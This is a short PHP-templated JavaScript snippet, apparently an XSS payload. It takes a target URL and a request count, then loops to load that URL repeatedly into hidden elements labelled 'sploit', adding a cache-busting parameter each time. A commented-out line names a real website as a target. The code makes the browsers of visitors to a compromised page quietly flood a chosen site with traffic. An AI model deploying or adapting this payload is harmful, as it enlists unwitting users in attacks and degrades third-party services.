
var xssurl = decodeURIComponent("<?=$url?>");
var xssrequests = <?=(isset($requests)) ? $requests : 10?>;
/*
var xssurl = "http://blog.bodybuilding.com/";
for (var i=0;i=<<?=$requests?>;i++) {
*/

for (var i=0;i<xssrequests;i++) {
var url2 = xssurl;
if (xssurl.indexOf("?")>0) { url2 = xssurl + "&v="+i; }
else { url2 = xssurl + "?v="+i; }
console.log(url2);
ci(url2, "display:none;", "sploit");
}
